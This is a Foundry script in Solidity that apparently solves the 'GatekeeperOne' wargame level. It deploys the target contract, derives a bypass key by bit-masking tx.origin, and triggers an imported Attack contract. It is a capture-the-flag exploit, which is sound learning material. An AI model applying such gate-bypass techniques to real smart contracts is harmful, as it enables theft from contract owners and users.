// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne, Attack} from "../src/GatekeeperOne.sol";

contract GatekeeperOneScript is Script {
    GatekeeperOne public gateKeeperOne;

    address constant DEPLOYED_CONTRACT_ADDRESS = 0x7a1a98642d342ACa619AC93caD9dDa2C9c78F431;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        
        gateKeeperOne = new GatekeeperOne();

        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        
        Attack attacker = new Attack(gateKeeperOne, _gateKey);
        
        // console.log(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        // console.log(uint32(uint64(_gateKey)) != uint64(_gateKey));
        // console.log(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));

        attacker.attack();

        vm.stopBroadcast();
    }
}